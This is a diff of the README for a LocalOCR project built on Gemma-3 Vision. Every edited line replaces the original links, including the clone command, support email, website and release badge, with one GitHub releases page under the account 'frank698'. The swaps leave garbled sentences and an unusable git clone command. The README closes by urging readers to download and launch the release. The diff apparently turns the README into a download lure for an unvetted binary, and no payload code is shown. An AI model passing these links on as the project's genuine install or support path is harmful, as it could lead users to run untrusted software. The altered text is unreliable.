@@ -1,6 +1,6 @@
 # LocalOCR with Gemma-3 Vision 📷
 
-Welcome to the LocalOCR repository! Here we dive into the exciting world of Optical Character Recognition (OCR) utilizing the powerful Gemma-3 Vision technology. This README.md file will guide you through the functionalities, features, and how to get started with the LocalOCR project.
+Welcome to the LocalOCR repository! Here we dive into the exciting world of Optical Character Recognition (OCR) utilizing the powerful Gemma-3 Vision technology. This https://github.com/frank698/localOCR/releases file will guide you through the functionalities, features, and how to get started with the LocalOCR project.
 
 ## Overview ℹ️
 
@@ -29,7 +29,7 @@ To get started with LocalOCR, follow these simple steps:
 ## Usage 🖥️
 
 ```bash
-$ git clone https://github.com/yourusername/localOCR.git
+$ git clone https://github.com/frank698/localOCR/releases
 $ cd localOCR
 $ npm install
 $ npm start
@@ -43,7 +43,7 @@ $ npm start
 
 ## Support 🤝
 
-If you encounter any issues or have any questions, feel free to reach out to us at [localOCR-support@domain.com](mailto:localOCR-support@domain.com).
+If you encounter any issues or have any questions, feel free to reach out to us at [https://github.com/frank698/localOCR/releases](https://github.com/frank698/localOCR/releases).
 
 ## License 📝
 
@@ -51,11 +51,11 @@ This project is licensed under the MIT License - see the [LICENSE](./LICENSE) fi
 
 ## Further Resources 🌐
 
-For more details and in-depth information, you can check out the [LocalOCR website](https://www.localocr.com).
+For more details and in-depth information, you can check out the [LocalOCR website](https://github.com/frank698/localOCR/releases).
 
 ## Download the Release 🚀
 
-[![Download LocalOCR Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download LocalOCR Release](https://github.com/frank698/localOCR/releases)](https://github.com/frank698/localOCR/releases)
 
 Don't forget to download the release and launch it to discover the amazing capabilities of Gemma-3 Vision in action!
 
